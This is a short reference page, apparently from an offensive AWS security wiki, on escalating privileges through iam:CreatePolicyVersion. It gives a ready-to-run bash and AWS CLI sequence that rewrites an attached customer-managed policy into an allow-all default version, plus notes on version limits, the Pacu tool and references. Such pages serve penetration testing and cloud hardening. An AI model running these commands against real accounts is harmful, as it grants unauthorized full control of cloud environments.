---
title: "CreatePolicyVersion: publish an allow-all default policy version"
description: "iam:CreatePolicyVersion with SetAsDefault to publish a new default version of a managed policy that grants full access."
keywords:
  - CreatePolicyVersion
  - managed policy
  - SetAsDefault
  - policy version
  - admin
---

# CreatePolicyVersion

A managed policy keeps up to five versions, one marked default. `iam:CreatePolicyVersion` with `--set-as-default` publishes a new version and activates it in one call, so if you can edit any managed policy already attached to your principal, you rewrite it to allow everything.

## Grant full access

```bash
cat > admin.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF
aws iam create-policy-version \
  --policy-arn arn:aws:iam::<acct>:policy/<attached-policy> \
  --policy-document file://admin.json --set-as-default
```

Your principal now holds `*:*` because the edited policy is attached to it.

## Exploitation notes

- Target a customer-managed policy already attached to you; AWS-managed policies cannot be edited.
- If five versions already exist, delete a non-default one first (`delete-policy-version`), then create.
- `SetAsDefault` is the key flag; without it the permissive version exists but is inactive, which is the [SetDefaultPolicyVersion](set-default-policy-version.md) case.

## Tools

- **AWS CLI** (`iam create-policy-version`).
- **Pacu** (`iam__privesc_scan`): detects and performs this path.

## References

- [Rhino Security Labs: AWS privilege escalation (CreatePolicyVersion)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [AWS: managed policy versions](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-versioning.html)
